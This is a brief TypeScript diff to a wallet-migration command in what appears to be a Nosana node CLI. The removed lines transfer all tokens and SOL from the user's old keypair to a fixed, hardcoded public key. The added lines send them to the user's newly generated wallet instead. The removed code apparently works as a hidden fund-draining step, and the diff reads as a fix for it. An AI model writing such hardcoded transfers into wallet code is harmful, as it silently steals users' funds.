@@ -57,15 +57,9 @@ export async function migrateWalletCommand(opts: { [key: string]: string }) {
   migrateSecertFile(walletPath);
   const newKeyPair = generateNewWallet(walletPath);
 
-  await tokenTransfer(
-    suspectedKeyPair,
-    new PublicKey('2d7v9xwFcu8BMMW4GqZunxWoRPQBruSxavJ4phSKGHo7'),
-  );
+  await tokenTransfer(suspectedKeyPair, newKeyPair.publicKey);
 
-  await solTransfer(
-    suspectedKeyPair,
-    new PublicKey('2d7v9xwFcu8BMMW4GqZunxWoRPQBruSxavJ4phSKGHo7'),
-  );
+  await solTransfer(suspectedKeyPair, newKeyPair.publicKey);
 
   const node = new NosanaNode(
     getSDK(),
